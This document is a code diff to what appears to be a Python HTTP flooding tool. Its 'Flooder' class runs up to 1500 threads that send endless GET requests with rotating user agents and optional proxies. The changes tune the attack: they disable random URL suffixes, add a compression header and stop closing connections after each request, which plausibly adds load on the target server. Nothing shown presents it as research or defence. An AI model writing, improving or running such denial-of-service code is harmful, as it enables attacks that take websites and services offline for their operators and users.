@@ -12,7 +12,7 @@ import string
 referrer = ""
 request_methods = ["GET"]
 thread_limit = 1500
-append_rand_string_to_url = True
+append_rand_string_to_url = False
 min_timeout = 0
 max_timeout = 30
 # Global variables
@@ -32,7 +32,8 @@ class Flooder(threading.Thread):
             while True:
                 cur_header = {
                     "User-agent": random.choice(user_agents),
-                    "Referrer": referrer
+                    "Referrer": referrer,
+                    "Accept-Encoding": "gzip,deflate"
                 }
                 if len(proxies) == 0:  # setting direct connection here
                     connection = http.client.HTTPConnection(cur_url.netloc, timeout=random.randint(min_timeout, max_timeout))
@@ -45,7 +46,6 @@ class Flooder(threading.Thread):
                 else:
                     randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
                     connection.request(method=random.choice(request_methods), url=url_str + randstr, headers=cur_header)
-                connection.close()
         except:
             sys.exit()
             pass
